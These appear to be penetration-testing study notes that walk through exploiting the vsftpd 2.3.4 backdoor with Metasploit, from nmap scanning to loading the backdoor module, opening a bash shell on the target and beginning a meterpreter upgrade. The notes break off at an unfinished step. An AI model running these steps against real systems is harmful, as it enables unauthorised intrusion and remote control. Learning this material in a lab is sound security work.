
### Exploiting a vulnerable FTP server 

- port 21 - facilitate file sharing between server and clients 
- transfer files to and from the directory of a web server 
- vsftpd is an FTP server for Unix-like systems including Linux systems and the default FTP server for ubuntu, CentOS and Fedora 
- vsftpd V2.3.4 is vulnerable to a command execution vulnerability that is facilitated by a malicious backdoor that was added to the vsftpd download archive through supply chain attack.

1) `service` `PostgreSQL` `start` 
2) `msfconsole` 
3) create new `workspace` 
4) set global variable for `rhosts` (setg)
5) perform service detection, operating detection and syn scan: `db_nmap -sS -sV -O ip `
6) `search vsftpd `
7) `use exploit/unix/ftp/vsftpd_234_backdoor `
8) open bash terminal on target system: ` /bin/bash -i `
9) upgrade session to meterpreter session (put other session in background)
	1) `search shell_to_meterpreter` (will upgrade current shell session to meterpreter session)
	2) `use post/multi/manage/shell_to_meterprete`r (this is a post module so you can only use it when you have an active session on the target system)
	3) 